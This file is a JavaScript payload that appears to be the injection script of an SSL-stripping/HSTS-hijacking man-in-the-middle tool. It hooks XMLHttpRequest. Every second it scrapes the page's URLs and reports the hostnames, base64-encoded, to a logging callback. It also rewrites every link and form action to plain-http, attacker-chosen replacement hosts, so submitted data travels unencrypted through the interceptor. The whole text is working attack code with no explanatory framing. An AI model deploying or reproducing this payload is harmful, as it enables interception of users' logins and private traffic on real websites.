var obf_var_callback_log = [];

function obf_func_hstshijack(obf_host) {
	var obf_var_regexp;
	if (obf_var_target_hosts[obf_var_i].match("^[*]")) {
		obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\-/g, "\\-").replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)").replace(/\./g, "\\.") + "$", "i");
	} else {
		obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\-/g, "\\-").replace(/\./g, "\\.") + "$", "i");
	}
	if (obf_host.match(obf_var_regexp)) {
		var obf_var_replacement;
		if (obf_var_target_hosts[obf_var_i].match("^[*]")) {
			obf_var_replacement = "$1" + obf_var_replacement_hosts[obf_var_i].replace(/^[*][.]/, "");
		} else {
			obf_var_replacement = obf_var_replacement_hosts[obf_var_i];
		}
		obf_host = obf_host.replace(obf_var_regexp, obf_var_replacement);
	}
	return obf_host;
}

(function() {
	var obf_open = XMLHttpRequest.prototype.open;
	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
		for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
				obf_var_path = obf_var_url.replace(/^(?:http[s]?:[/]{2}[^/?]*)?([/?].*$)/, "$1");
				obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^(?:http[s]?:[/]{2})?([^/?:]*(?::\d+)?).*/i, "$1"));
		}
		return obf_open.apply(this, arguments);
	}
})();

function obf_func_callback(obf_var_data) {
	obf_var_req = new XMLHttpRequest();
	obf_var_req.obf_open("GET", "http://" + location.host + "/obf_path_ssl_log?" + obf_var_data, true);
	obf_var_req.send();
}

function obf_func_attack() {
	try {
		obf_var_regexp = new RegExp("http[s]?:\\/\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{1,63}))(?::80|:443){0,1}", "ig");
		obf_var_urls = document.body.innerHTML.match(obf_var_regexp);
		for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
			obf_var_host = obf_var_urls[obf_var_i].replace(obf_var_regexp, "$1");
			if (obf_var_callback_log.indexOf(obf_var_host) == -1) {
				obf_func_callback(btoa(obf_var_host));
				obf_var_callback_log.push(obf_var_host);
			}
		}
	} catch(obf_var_ignore){}
	try {
		for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
			document.querySelectorAll("a, form").forEach(function(obf_var_node){
				obf_var_node.tagName == "A" ? obf_var_url = obf_var_node.href : obf_var_url = obf_var_node.action;
				obf_var_path = obf_var_url.replace(/^(?:http[s]?:[/]{2}[^/?]*)?([/?].*$)/, "$1");
				obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^(?:http[s]?:[/]{2})?([^/?:]*(?::\d+)?).*/i, "$1"));
				obf_var_node.tagName == "A" ? obf_var_node.href = "http://" + obf_var_host + obf_var_path : obf_var_node.action = "http://" + obf_var_host + obf_var_path;
			})
		}
	} catch(obf_var_ignore){}
}

try {
	document.addEventListener('DOMContentLoaded', function(){
		obf_func_attack();
	});
} catch(obf_var_ignore){}

setInterval(obf_func_attack, 1000);
